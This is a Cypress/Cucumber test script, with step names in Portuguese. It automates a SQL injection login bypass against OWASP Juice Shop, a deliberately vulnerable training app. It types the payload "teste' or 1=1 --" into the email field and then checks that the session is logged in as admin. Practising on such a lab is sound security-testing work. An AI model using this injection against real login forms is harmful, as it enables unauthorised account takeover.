/// <reference types="cypress" />
import { Given, And, Then } from "cypress-cucumber-preprocessor/steps"

Given("que acessa a pagina home", () =>{
    cy.visit('https://juice-shop.herokuapp.com/')
})

And("que eu aperta Dismiss", () =>{
    cy.contains('button', "Dismiss").click()
})

And("que eu aperta Account", () =>{
    cy.contains('button', "Account").click()
})

And("que eu aperta login", () =>{
    cy.contains('button', "Login").click()
})

And("coloca Codigo malicioso", () =>{
    cy.get('#email').type("teste' or 1=1 --")
})

And("coloca baboseira", () =>{
    cy.get('#password').type('123')
})

Then("aperta log in", () =>{
    cy.contains('button', "Log in").click()
})

Then("verifica que eu sou admin", () =>{
    cy.get('.mat-menu-content > [aria-label="Go to user profile"] > span').should('be.visible').and('contain.text', 'admin@juice-sh.op');
})
